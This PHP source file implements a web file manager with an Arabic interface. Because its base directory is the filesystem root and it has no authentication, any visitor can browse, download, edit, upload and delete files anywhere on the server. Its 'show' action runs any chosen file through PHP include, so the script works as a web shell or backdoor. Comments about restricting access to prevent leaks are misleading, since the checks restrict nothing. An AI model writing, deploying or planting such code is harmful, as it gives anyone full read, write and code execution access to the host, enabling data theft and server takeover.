<?php
// تحديد الدليل الأساسي الذي يسمح بالوصول إليه على نظام Linux
$base_dir = '/';

// تحديد المجلد الحالي من GET أو استخدام المجلد الافتراضي (الدليل الأساسي)
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $base_dir;

// التأكد من أن المجلد الحالي موجود وضمن الدليل الأساسي
if (!$current_dir || strpos($current_dir, $base_dir) !== 0) {
    $current_dir = $base_dir;
}

// مسار الرجوع إلى المجلد السابق، يتم عرضه فقط إذا لم نصل للدليل الأساسي
$parent_dir = dirname($current_dir);
$back_link = ($current_dir !== $base_dir) ? "<a href='?dir=" . urlencode($parent_dir) . "'>⬅️ رجوع</a>" : "";

/**
 * دالة لحذف مجلد بشكل تكراري
 */
function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($dir);
}

// تحميل الملفات عند الطلب
if (isset($_GET['download'])) {
    $file = realpath($_GET['download']);
    // التحقق من أن الملف موجود وأنه يقع ضمن الدليل الأساسي لتفادي التسريب
    if ($file && strpos($file, $base_dir) === 0 && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "ملف غير صالح.";
        exit;
    }
}

// حذف الملف أو المجلد عند الطلب
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    // التأكد من أن المسار موجود وأنه يقع ضمن الدليل الأساسي
    if (!$target || strpos($target, $base_dir) !== 0 || (!is_file($target) && !is_dir($target))) {
        echo "ملف أو مجلد غير صالح.";
        exit;
    }
    
    // عند إرسال النموذج (تأكيد أو إلغاء)
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['confirm'])) {
            $deleted = false;
            if (is_file($target)) {
                $deleted = unlink($target);
            } elseif (is_dir($target)) {
                // حذف المجلد بشكل تكراري
                $deleted = deleteDirectory($target);
            }
            if ($deleted) {
                header("Location: ?dir=" . urlencode(dirname($target)));
                exit;
            } else {
                $error = "حدث خطأ أثناء حذف الملف/المجلد.";
            }
        }
        if (isset($_POST['cancel'])) {
            header("Location: ?dir=" . urlencode(dirname($target)));
            exit;
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>حذف: <?php echo htmlspecialchars(basename($target)); ?></title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            button { padding: 8px 12px; margin-right: 10px; font-size: 14px; cursor: pointer; }
            .error { color: red; }
        </style>
    </head>
    <body>
        <h2>حذف: <?php echo htmlspecialchars($target); ?></h2>
        <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
        <p>هل أنت متأكد من حذف هذا <?php echo is_dir($target) ? "المجلد" : "الملف"; ?>؟</p>
        <?php if(is_dir($target)) { ?>
            <p>سيتم حذف جميع المحتويات الموجودة بداخله بشكل تكراري.</p>
        <?php } ?>
        <form method="POST" action="?delete=<?php echo urlencode($target); ?>">
            <button type="submit" name="confirm">نعم، حذف</button>
            <button type="submit" name="cancel">إلغاء</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// ميزة عرض الملف (تنفيذه وعرض الناتج)
if (isset($_GET['show'])) {
    $file = realpath($_GET['show']);
    // التحقق من أن الملف موجود وأنه يقع ضمن الدليل الأساسي
    if (!$file || strpos($file, $base_dir) !== 0 || !is_file($file)) {
        echo "ملف غير صالح.";
        exit;
    }

    // تنفيذ الملف على السيرفر وإظهار الناتج
    ob_start();
    include $file;
    $output = ob_get_clean();

    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>عرض الملف: <?php echo htmlspecialchars(basename($file)); ?></title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .back-link { margin-bottom: 20px; display: block; }
        </style>
    </head>
    <body>
        <a class="back-link" href="?dir=<?php echo urlencode(dirname($file)); ?>">⬅️ رجوع</a>
        <h2>عرض الملف: <?php echo htmlspecialchars(basename($file)); ?></h2>
        <hr>
        <?php echo $output; ?>
    </body>
    </html>
    <?php
    exit;
}

// تحرير الملف عند الطلب
if (isset($_GET['edit'])) {
    $file = realpath($_GET['edit']);
    // التحقق من أن الملف موجود وأنه يقع ضمن الدليل الأساسي
    if (!$file || strpos($file, $base_dir) !== 0 || !is_file($file)) {
        echo "ملف غير صالح.";
        exit;
    }
    
    // عند إرسال النموذج (حفظ أو إلغاء)
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['save'])) {
            $new_content = $_POST['filecontent'];
            if (file_put_contents($file, $new_content) !== false) {
                header("Location: ?dir=" . urlencode(dirname($file)));
                exit;
            } else {
                $error = "حدث خطأ أثناء حفظ الملف.";
            }
        }
        if (isset($_POST['cancel'])) {
            header("Location: ?dir=" . urlencode(dirname($file)));
            exit;
        }
    }
    
    $file_content = file_get_contents($file);
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>✏️ تحرير الملف: <?php echo htmlspecialchars(basename($file)); ?></title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            textarea { width: 100%; height: 400px; padding: 10px; font-family: Consolas, monospace; font-size: 14px; border: 1px solid #ccc; border-radius: 5px; }
            button { padding: 8px 12px; margin-right: 10px; font-size: 14px; cursor: pointer; }
            .error { color: red; }
        </style>
    </head>
    <body>
        <h2>✏️ تحرير الملف: <?php echo htmlspecialchars($file); ?></h2>
        <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
        <form method="POST" action="?edit=<?php echo urlencode($file); ?>">
            <textarea name="filecontent"><?php echo htmlspecialchars($file_content); ?></textarea>
            <br><br>
            <button type="submit" name="save">💾 حفظ</button>
            <button type="submit" name="cancel">❌ إلغاء</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// ميزة تعديل اسم الملف أو المجلد
if (isset($_GET['rename'])) {
    $target = realpath($_GET['rename']);
    // التأكد من أن المسار موجود وأنه يقع ضمن الدليل الأساسي
    if (!$target || strpos($target, $base_dir) !== 0) {
        echo "ملف أو مجلد غير صالح.";
        exit;
    }
    
    // عند إرسال النموذج لتعديل الاسم
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['save'])) {
            $new_name = trim($_POST['new_name']);
            if (empty($new_name)) {
                $error = "الاسم الجديد لا يمكن أن يكون فارغاً.";
            } else {
                // التأكد من عدم وجود مسارات داخل الاسم الجديد
                $new_name = basename($new_name);
                $new_path = dirname($target) . DIRECTORY_SEPARATOR . $new_name;
                // التحقق من عدم تكرار الاسم بنفسه
                if ($new_path === $target) {
                    $error = "الاسم الجديد مطابق للقديم.";
                } else {
                    if (file_exists($new_path)) {
                        $error = "يوجد ملف أو مجلد بهذا الاسم مسبقاً.";
                    } else {
                        if (rename($target, $new_path)) {
                            header("Location: ?dir=" . urlencode(dirname($new_path)));
                            exit;
                        } else {
                            $error = "حدث خطأ أثناء تغيير الاسم.";
                        }
                    }
                }
            }
        }
        if (isset($_POST['cancel'])) {
            header("Location: ?dir=" . urlencode(dirname($target)));
            exit;
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>تعديل الاسم: <?php echo htmlspecialchars(basename($target)); ?></title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            input { width: 80%; padding: 8px; margin-bottom: 10px; }
            button { padding: 8px 12px; margin-right: 10px; font-size: 14px; cursor: pointer; }
            .error { color: red; }
        </style>
    </head>
    <body>
        <h2>تعديل الاسم: <?php echo htmlspecialchars($target); ?></h2>
        <?php if (isset($error)) { echo "<p class='error'>$error</p>"; } ?>
        <form method="POST" action="?rename=<?php echo urlencode($target); ?>">
            <input type="text" name="new_name" placeholder="أدخل الاسم الجديد" required>
            <br>
            <button type="submit" name="save">💾 حفظ التعديل</button>
            <button type="submit" name="cancel">❌ إلغاء</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// ميزة رفع الملفات
$uploadError = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    if ($_FILES['upload_file']['error'] !== UPLOAD_ERR_OK) {
        switch ($_FILES['upload_file']['error']) {
            case UPLOAD_ERR_INI_SIZE:
            case UPLOAD_ERR_FORM_SIZE:
                $uploadError = "حجم الملف كبير جدًا.";
                break;
            case UPLOAD_ERR_PARTIAL:
                $uploadError = "تم تحميل الملف جزئيًا.";
                break;
            case UPLOAD_ERR_NO_FILE:
                $uploadError = "لم يتم تحميل أي ملف.";
                break;
            default:
                $uploadError = "حدث خطأ أثناء رفع الملف.";
        }
    } else {
        $target_file = $current_dir . DIRECTORY_SEPARATOR . basename($_FILES['upload_file']['name']);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
            header("Location: ?dir=" . urlencode($current_dir));
            exit;
        } else {
            $uploadError = "حدث خطأ أثناء نقل الملف المرفوع.";
        }
    }
}

// ميزة إنشاء مجلد جديد
$mkdirError = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_folder'])) {
    $folder_name = trim($_POST['folder_name']);
    if (empty($folder_name)) {
        $mkdirError = "اسم المجلد لا يمكن أن يكون فارغاً.";
    } else {
        // التأكد من عدم وجود مسارات داخل الاسم الجديد
        $folder_name = basename($folder_name);
        $new_folder_path = $current_dir . DIRECTORY_SEPARATOR . $folder_name;
        if (file_exists($new_folder_path)) {
            $mkdirError = "يوجد مجلد أو ملف بنفس الاسم.";
        } else {
            if (!mkdir($new_folder_path, 0755)) {
                $mkdirError = "حدث خطأ أثناء إنشاء المجلد.";
            } else {
                header("Location: ?dir=" . urlencode($current_dir));
                exit;
            }
        }
    }
}

// جلب الملفات والمجلدات من المجلد الحالي
$items = scandir($current_dir);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>📂 متصفح الملفات</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        a { text-decoration: none; color: #007bff; font-weight: bold; }
        a:hover { text-decoration: underline; }
        ul { list-style-type: none; padding: 0; }
        li { margin: 8px 0; padding: 10px; background: #f8f9fa; border-radius: 5px; }
        li:hover { background: #e2e6ea; }
        input { width: 80%; padding: 8px; margin-bottom: 10px; }
        button { padding: 8px 12px; cursor: pointer; }
        .options { margin-top: 5px; }
        .options a { margin-right: 10px; font-size: 13px; }
        .upload-container, .mkdir-container { margin-top: 20px; padding: 15px; background: #e9ecef; border-radius: 5px; }
        .error { color: red; }
    </style>
</head>
<body>
    <h2>📂 متصفح الملفات</h2>
    
    <!-- نموذج لتغيير المسار يدويًا -->
    <form method="GET">
        <input type="text" name="dir" value="<?php echo htmlspecialchars($current_dir); ?>">
        <button type="submit">🔍 فتح</button>
    </form>
    
    <p>📁 المسار الحالي: <strong><?php echo $current_dir; ?></strong></p>
    <p><?php echo $back_link; ?></p>
    
    <!-- نموذج رفع الملف -->
    <div class="upload-container">
        <h3>رفع ملف جديد</h3>
        <?php if ($uploadError): ?>
            <p class="error"><?php echo $uploadError; ?></p>
        <?php endif; ?>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="upload_file" required>
            <button type="submit">رفع الملف</button>
        </form>
    </div>
    
    <!-- نموذج إنشاء مجلد جديد -->
    <div class="mkdir-container">
        <h3>إنشاء مجلد جديد</h3>
        <?php if ($mkdirError): ?>
            <p class="error"><?php echo $mkdirError; ?></p>
        <?php endif; ?>
        <form method="POST">
            <input type="text" name="folder_name" placeholder="أدخل اسم المجلد الجديد" required>
            <button type="submit" name="new_folder">إنشاء المجلد</button>
        </form>
    </div>
    
    <ul>
        <?php
        foreach ($items as $item) {
            if ($item === "." || $item === "..") continue;
            $full_path = realpath($current_dir . DIRECTORY_SEPARATOR . $item);
            if (!$full_path) continue;
            
            if (is_dir($full_path)) {
                echo "<li>📁 <a href='?dir=" . urlencode($full_path) . "'>" . htmlspecialchars($item) . "</a>";
                echo "<div class='options'>";
                echo "<a href='?rename=" . urlencode($full_path) . "'>تعديل الاسم</a>";
                echo "<a href='?delete=" . urlencode($full_path) . "'>حذف</a>";
                echo "</div>";
                echo "</li>";
            } else {
                echo "<li>📄 " . htmlspecialchars($item);
                echo "<div class='options'>";
                echo "<a href='?download=" . urlencode($full_path) . "'>تحميل</a>";
                echo "<a href='?edit=" . urlencode($full_path) . "'>تعديل</a>";
                echo "<a href='?rename=" . urlencode($full_path) . "'>تعديل الاسم</a>";
                echo "<a href='?delete=" . urlencode($full_path) . "'>حذف</a>";
                echo "<a href='?show=" . urlencode($full_path) . "'>عرض</a>";
                echo "</div>";
                echo "</li>";
            }
        }
        ?>
    </ul>
</body>
</html>
